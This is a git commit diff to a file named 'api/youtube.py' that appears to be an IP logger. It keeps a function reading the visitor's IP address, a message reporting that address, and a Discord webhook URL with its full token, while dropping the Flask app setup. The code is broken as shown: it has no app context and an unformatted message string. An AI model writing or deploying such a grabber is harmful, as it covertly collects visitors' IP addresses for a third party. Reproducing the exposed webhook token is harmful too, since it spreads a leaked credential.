b17d055bd79f7a9bb126368d9ae43200a24c7b0f
FralkA <153741594+FralkA@users.noreply.github.com>
2024-01-03 15:36:27 +0100

    Update youtube.py

--- api/youtube.py
+++ api/youtube.py
@@ -2,15 +2,10 @@ from flask import Flask, request
 import requests 
 import json
 
-app = Flask(__name__)
-
-@app.route('/')
 def get_user_ip():
     user_ip = request.remote_addr
     return f"L'adresse IP de l'utilisateur est : {user_ip}"
 
-if __name__ == '__main__':
-    app.run(debug=True)
 
 webhook_url = "https://discord.com/api/webhooks/1192113766750502932/N8tbEeBcTztezvIA61eAtpvCDAd28C3yA-Wl5r-OtkwUe_xulml1dTcXJmhLsQ3OpoWg"
 message =  "l adresse ip de l utilisteur est : {user_ip}"
